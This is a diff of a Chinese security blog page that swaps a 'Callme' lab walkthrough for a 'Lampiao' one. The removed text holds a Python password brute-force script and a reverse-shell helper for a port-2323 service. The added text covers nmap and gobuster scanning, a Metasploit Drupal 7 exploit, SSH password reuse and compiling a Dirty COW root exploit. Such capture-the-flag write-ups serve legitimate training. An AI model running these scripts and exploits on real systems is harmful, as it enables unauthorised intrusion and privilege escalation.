@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
   
-  <title>Callme   | magisec网络安全博客</title>
+  <title>Lampiao   | magisec网络安全博客</title>
 
   
     <link rel="apple-touch-icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
@@ -84,49 +84,69 @@
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">Callme</div>
+      <div class="post-title">Lampiao</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime" title="Update time"></i>
-          2020-12-25
+          2020-12-26
         </span>
         
       </div>
       <div class="markdown-body">
         <h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p>
-<p>靶机IP：192.168.56.122</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap探测端口"><a href="#nmap探测端口" class="headerlink" title="nmap探测端口"></a>nmap探测端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oN callme.nmap 192.168.56.122</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5fe5b226d9938" alt="image-20201225155907560"></p>
+<p>靶机IP：192.168.56.119</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap探测端口"><a href="#Nmap探测端口" class="headerlink" title="Nmap探测端口"></a>Nmap探测端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- 192.168.56.119 -oN .&#x2F;Lampiao&#x2F;Lampiao.nmap</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d69fce8f0" alt="image-20201222100903229"></p>
+<h3 id="分析Nmap扫描结果"><a href="#分析Nmap扫描结果" class="headerlink" title="分析Nmap扫描结果"></a>分析Nmap扫描结果</h3><p>操作系统：ubuntu 低版本</p>
+<p>端口开放：22 80 1898</p>
 <p>22 ssh</p>
-<p>111 rpcbind</p>
-<p>2323 未知</p>
-<h2 id="2323端口检测"><a href="#2323端口检测" class="headerlink" title="2323端口检测"></a>2323端口检测</h2><h3 id="探测信息"><a href="#探测信息" class="headerlink" title="探测信息"></a>探测信息</h3><p>使用nc连接探测</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.56.122 2323</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5fe5b22d48a51" alt="image-20201225160014303"></p>
-<p>我们使用telnet连接一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.56.122 2323</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5fe5b2329d333" alt="image-20201225160050624"></p>
-<h3 id="python3编写socket爆破脚本"><a href="#python3编写socket爆破脚本" class="headerlink" title="python3编写socket爆破脚本"></a>python3编写socket爆破脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim brute.py</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import socket,time</span><br><span class="line"></span><br><span class="line">with open(&quot;.&#x2F;top500.txt&quot;) as file:</span><br><span class="line">    for password in file:</span><br><span class="line">        username &#x3D; b&quot;admin&quot;</span><br><span class="line">        password &#x3D; password.strip()</span><br><span class="line">        print(&quot;Password is brute force: %s&quot; % password)</span><br><span class="line">        password &#x3D; password.encode()</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((&quot;192.168.56.122&quot;, 2323))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        time.sleep(1.5)</span><br><span class="line">        s.send(username+b&#39;\r\n&#39;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.send(password+b&#39;\r\n&#39;)</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        if &quot;Wrong password for user admin&quot; not in str(s.recv(1024)):</span><br><span class="line">            print(&quot;[*]The password of admin is %s&quot; % password.decode())</span><br><span class="line">            break</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure>
-<p>我们使用一份top500的字典进行爆破，每次爆破要sleep一下，要不然靶机服务反映不过来。Python3运行，等待爆破结果。</p>
-<p><img src="https://img.rruu.net/image/5fe5b237bdce4" alt="image-20201225160308702"></p>
-<p>等待大概5分钟左右，程序就可以爆破出来了密码。</p>
-<p><img src="https://img.rruu.net/image/5fe5b23cd581f" alt="image-20201225160847184"></p>
-<p>使用telnet登录，会给我们一串很奇怪的东西。给我们一串数字，然后又跟我说我还没有准备好，感觉是会反弹回来一个shell，给的是端口。</p>
-<p><img src="https://img.rruu.net/image/5fe5b242eafa7" alt="image-20201225160958623"></p>
-<h3 id="python编写exp反弹shell"><a href="#python编写exp反弹shell" class="headerlink" title="python编写exp反弹shell"></a>python编写exp反弹shell</h3><p>运行即可反弹shell，需要先安装word2number</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import socket,time,os</span><br><span class="line">from word2number import w2n</span><br><span class="line"></span><br><span class="line">username &#x3D; b&quot;admin&quot;</span><br><span class="line">password &#x3D; b&quot;booboo&quot;</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.56.122&quot;, 2323))</span><br><span class="line">time.sleep(1)</span><br><span class="line">s.send(username+b&#39;\r\n&#39;)</span><br><span class="line">s.send(password+b&#39;\r\n&#39;)</span><br><span class="line">num &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    num +&#x3D; 1</span><br><span class="line">    body &#x3D; s.recv(1024)</span><br><span class="line">    if body &#x3D;&#x3D; b&quot;&quot;:</span><br><span class="line">        break</span><br><span class="line">    elif num &#x3D;&#x3D; 3:</span><br><span class="line">        port &#x3D; w2n.word_to_num(body.decode().lower().strip())</span><br><span class="line">        os.system(&quot;nc -lvnp &quot; + str(port))</span><br><span class="line">        continue</span><br><span class="line">    print(body)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-<p>获取flag.txt</p>
-<p><img src="https://img.rruu.net/image/5fe5b2481f654" alt="image-20201225162607358"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type local.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://img.rruu.net/image/5fe5b24cd6fd8" alt="image-20201225162620780"></p>
+<p>80 web （不正常的web程序，gobuster爆破目录有问题，换了两台不同的机器都是一样。dirb尝试也是一样爆破不行。）</p>
+<p>1898 web （Drupal 7）</p>
+<h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p><img src="https://img.rruu.net/image/5fe6d6a5e1b13" alt="image-20201222105527902"></p>
+<h3 id="gobuster扫描目录"><a href="#gobuster扫描目录" class="headerlink" title="gobuster扫描目录"></a>gobuster扫描目录</h3><p>他说的这个靶机这个很简单的。我们使用gobuster扫描一下靶机。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.119 -o dir.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d6ab68d78" alt="image-20201222105703038"></p>
+<h2 id="1898端口渗透"><a href="#1898端口渗透" class="headerlink" title="1898端口渗透"></a>1898端口渗透</h2><h3 id="CMS识别"><a href="#CMS识别" class="headerlink" title="CMS识别"></a>CMS识别</h3><p>根据nmap扫描的信息，我们分析一下这个1898端口。它是由drupal7搭建的，这里nmap给了一些文件，我们去访问一下，可以发现一些信息泄露。drupal版本号7.54，这个网站的ico也是drupal默认的。</p>
+<p><img src="https://img.rruu.net/image/5fe6d6b0de8e8" alt="image-20201222105347138"></p>
+<h3 id="Drupal7漏洞利用"><a href="#Drupal7漏洞利用" class="headerlink" title="Drupal7漏洞利用"></a>Drupal7漏洞利用</h3><p>我们搜索一下漏洞选择第一个，他说这个是有metasploit框架的利用程序的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal 7.54</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d6b6bc245" alt="image-20201222105743117"></p>
+<p>来到msf找到利用程序，use选中</p>
+<p><img src="https://img.rruu.net/image/5fe6d6bc97a49" alt="image-20201222110233244"></p>
+<p>设置如下，返回了一个会话。</p>
+<p><img src="https://img.rruu.net/image/5fe6d6c1b3731" alt="image-20201222110352743"></p>
+<p>查看一下权限</p>
+<p><img src="https://img.rruu.net/image/5fe6d6c78eb26" alt="image-20201222110451193"></p>
+<h2 id="提权提升"><a href="#提权提升" class="headerlink" title="提权提升"></a>提权提升</h2><p>当前权限为3w，我们先做信息收集。</p>
+<h3 id="Python切换bash"><a href="#Python切换bash" class="headerlink" title="Python切换bash"></a>Python切换bash</h3><p><img src="https://img.rruu.net/image/5fe6d6cc6230a" alt="image-20201222110916489"></p>
+<h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p><img src="https://img.rruu.net/image/5fe6d6d117709" alt="image-20201222111236570"></p>
+<h3 id="ssh登录碰撞"><a href="#ssh登录碰撞" class="headerlink" title="ssh登录碰撞"></a>ssh登录碰撞</h3><p>尝试将收集到密码用于登录，结果失败。我们继续去收集一下用户信息。</p>
+<p><img src="https://img.rruu.net/image/5fe6d6d5813e0" alt="image-20201222111447625"></p>
+<p>来到home目录，我们尝试一下这个用户。</p>
+<p><img src="https://img.rruu.net/image/5fe6d6daed914" alt="image-20201222111526744"></p>
+<p>尝试成功。</p>
+<p><img src="https://img.rruu.net/image/5fe6d6df8c24a" alt="image-20201222111629866"></p>
+<h3 id="脏牛特权提升"><a href="#脏牛特权提升" class="headerlink" title="脏牛特权提升"></a>脏牛特权提升</h3><p><img src="https://img.rruu.net/image/5fe6d6e43a981" alt="image-20201222111727210"></p>
+<p>内核版本为4.4.0</p>
+<p><img src="https://img.rruu.net/image/5fe6d6e9e7864" alt="image-20201222111759528"></p>
+<p>脏牛exp：<a target="_blank" rel="noopener" href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679">https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679</a></p>
+<p>这里要注意要一下，因为这个exp是64位的，我们这台机器是32位的，我们需要使用32位的shellcode。稍微修改一下脚本即可。</p>
+<p><img src="https://img.rruu.net/image/5fe6d6eea7149" alt="image-20201222124914503"></p>
+<p>上传到目标机器上使用gcc编译，出现错误不需要管他。脏牛一样可以提权。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o cowroot -pthread</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d6f3e52dc" alt="image-20201222124953203"></p>
+<p>执行exp，凡是内核漏洞权限提升都不是很稳定，都有可能提坏机器。这里我就提坏了，重启了好几次。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;cowroot</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe6d6f92f74d" alt="image-20201222125041299"></p>
+<p>获取flag文件</p>
+<p><img src="https://img.rruu.net/image/5fe6d6febbf46" alt="image-20201222125307554"></p>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2020/12/25/Linux%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF%E5%90%88%E9%9B%86/" target="_self">
+              <a href="/2020/12/26/Hackme-1/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -135,16 +155,11 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime" title="Update time"></i>
-              2020-12-25
+              2020-12-26
             </span>
             
           </div>
           <div class="post-foot-prev">
-            
-              <a href="/2020/12/26/Hackme-1/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
             
           </div>
         </div>
@@ -154,7 +169,7 @@
   <div class="post-catalog" id="catalog">
     <div class="title">Contents</div>
     <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-text">nmap探测端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2323%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%B5%8B"><span class="toc-text">2323端口检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E4%BF%A1%E6%81%AF"><span class="toc-text">探测信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python3%E7%BC%96%E5%86%99socket%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC"><span class="toc-text">python3编写socket爆破脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E7%BC%96%E5%86%99exp%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">python编写exp反弹shell</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-text">Nmap探测端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90Nmap%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C"><span class="toc-text">分析Nmap扫描结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">80端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gobuster%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95"><span class="toc-text">gobuster扫描目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1898%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-text">1898端口渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS%E8%AF%86%E5%88%AB"><span class="toc-text">CMS识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Drupal7%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">Drupal7漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">提权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%88%87%E6%8D%A2bash"><span class="toc-text">Python切换bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">主机信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%99%BB%E5%BD%95%E7%A2%B0%E6%92%9E"><span class="toc-text">ssh登录碰撞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">脏牛特权提升</span></a></li></ol></li></ol>
     </div>
   </div>
 
